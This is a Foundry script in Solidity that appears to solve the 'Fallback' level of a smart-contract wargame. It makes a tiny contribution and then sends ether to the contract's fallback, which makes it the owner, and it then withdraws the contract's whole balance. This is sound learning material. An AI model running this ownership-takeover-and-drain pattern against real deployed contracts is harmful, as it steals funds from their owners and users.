// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { Fallback } from "../src/01_Fallback.sol";

contract FallbackAttacker is Script {

  address payable challengeInstanceAddress = payable(0xa0fEd194dc31c971d488F09507Eb1dD4C469d658);
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
  Fallback private challenge = Fallback(challengeInstanceAddress);
  
  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    
    challenge.contribute{value: 1 wei}();
    (bool success,) = address(challenge).call{value: 1 wei}("");
    require(success, "Failed call");
    challenge.withdraw();
    
    console.log("Owner: %s", challenge.owner());
    console.log("Balance: %s", address(challenge).balance);
    
    vm.stopBroadcast();
  }
}